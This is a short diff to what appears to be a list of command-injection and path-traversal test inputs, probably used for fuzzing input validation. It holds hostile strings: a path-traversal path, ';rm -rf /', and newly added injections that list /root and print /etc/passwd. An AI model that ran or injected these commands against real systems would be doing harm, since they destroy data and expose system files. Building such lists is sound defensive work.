@@ -1,3 +1,6 @@
 ../../.././usr/bin/cat
 /usr/bin/cat
 ;rm -rf /
+; ls -la /root
+|pwd
+ | cat /etc/passwd
